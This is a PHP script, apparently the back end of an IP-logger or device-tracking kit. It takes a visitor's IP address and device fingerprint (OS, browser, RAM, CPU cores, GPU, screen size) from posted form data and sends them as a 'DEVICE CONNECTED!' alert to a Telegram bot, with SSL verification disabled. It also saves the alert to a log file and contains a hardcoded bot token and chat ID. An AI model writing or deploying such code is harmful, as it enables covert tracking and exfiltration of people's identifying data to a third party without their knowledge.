<?php
// ******************************************
// CONFIGURATION
// ******************************************
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId = "6862649950";
// ******************************************

// Receive Data
$os = $_POST['Os'];
$ptf = $_POST['Ptf'];
$brw = $_POST['Brw'];
$cc = $_POST['Cc'];
$ram = $_POST['Ram'];
$ven = $_POST['Ven'];
$ren = $_POST['Ren'];
$ht = $_POST['Ht'];
$wd = $_POST['Wd'];

// Get Real IP (Cloudflare support included)
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// Format Message (HTML Style)
$message = "<b>📱 DEVICE CONNECTED!</b>\n\n";
$message .= "<b>🌐 IP Address:</b> <code>" . $ip . "</code>\n";
$message .= "<b>💻 System:</b> " . $os . " (" . $ptf . ")\n";
$message .= "<b>🕸 Browser:</b> " . $brw . "\n";
$message .= "<b>📏 Screen:</b> " . $wd . "x" . $ht . " px\n\n";
$message .= "<b>HARDWARE DETAILS:</b>\n";
$message .= "💾 <b>RAM:</b> " . $ram . " GB\n";
$message .= "🧠 <b>Cores:</b> " . $cc . "\n";
$message .= "🎮 <b>GPU:</b> " . $ven . "\n";
$message .= "<i>" . $ren . "</i>";

// Send to Telegram (Using cURL for better stability)
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Save Log (Optional)
$f = fopen('../../logs/info.txt', 'w+');
fwrite($f, $message);
fclose($f);
?>
